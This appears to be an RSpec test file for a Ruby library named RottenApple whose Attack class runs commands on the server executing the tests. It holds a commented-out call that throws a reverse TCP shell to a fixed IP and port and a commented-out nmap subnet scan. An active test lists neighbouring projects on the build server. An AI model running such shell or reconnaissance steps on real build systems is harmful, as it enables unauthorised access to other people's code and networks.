require 'rotten_apple'

describe RottenApple::Attack do

  before(:each) do
    @attack = RottenApple::Attack.new()
  end

  context "when trying to throw a reverse shell" do 
    subject{@attack}
    its(:class) {should == RottenApple::Attack}
    
    #it "should throw a reverse tcp shell" do
    # subject.reverse_shell('10.225.71.7', 1337)
    #end

    #it "should perform an NMAP scan" do
    #  subject.command('nmap -p 80,443 --open -Pn -P0 -n -T4 10.255.71.0/24')
    #end

    it "should list the other projects built on this server" do
      subject.command('ls ../../')
    end
  end

end
